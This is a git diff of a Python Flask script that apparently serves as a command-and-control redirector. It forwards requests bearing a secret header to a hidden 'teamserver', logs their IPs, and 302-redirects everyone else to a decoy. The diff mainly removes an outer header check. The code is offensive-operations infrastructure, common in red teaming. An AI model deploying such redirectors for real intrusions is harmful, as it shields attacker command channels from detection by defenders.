@@ -54,25 +54,25 @@ def fileserve(filename):
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=method_requests_mapping.keys())
 def teamserver(path):
-    if header:
-        if headerkey in flask.request.headers.get(header):
-            url = teamserver + path
-            requests_function = method_requests_mapping[flask.request.method]
-            ip = flask.request.remote_addr
-            request = flask.request.base_url
-            ua = flask.request.headers.get('User-Agent')
-            with open("access.log", "a") as log:
-                log.write("Secret Cookie Requested from: " + ip)
-                log.write('\n')
-            request = requests_function(url, stream=True, params=flask.request.args)
-            response = flask.Response(flask.stream_with_context(request.iter_content()),
-                              content_type=request.headers['content-type'],
-                              status=request.status_code)
-            response.headers['Access-Control-Allow-Origin'] = '*'
-            return response
-        else:
-            return redirect(redirect_url, code=302)
-    return redirect(redirect_url, code=302)
+
+    if headerkey in flask.request.headers.get(header):
+        url = teamserver + path
+        requests_function = method_requests_mapping[flask.request.method]
+        ip = flask.request.remote_addr
+        request = flask.request.base_url
+        ua = flask.request.headers.get('User-Agent')
+        with open("access.log", "a") as log:
+            log.write("Secret Cookie Requested from: " + ip)
+            log.write('\n')
+        request = requests_function(url, stream=True, params=flask.request.args)
+        response = flask.Response(flask.stream_with_context(request.iter_content()),
+                            content_type=request.headers['content-type'],
+                            status=request.status_code)
+        response.headers['Access-Control-Allow-Origin'] = '*'
+        return response
+    else:
+        return redirect(redirect_url, code=302)
+
 
 
 if __name__ == '__main__':
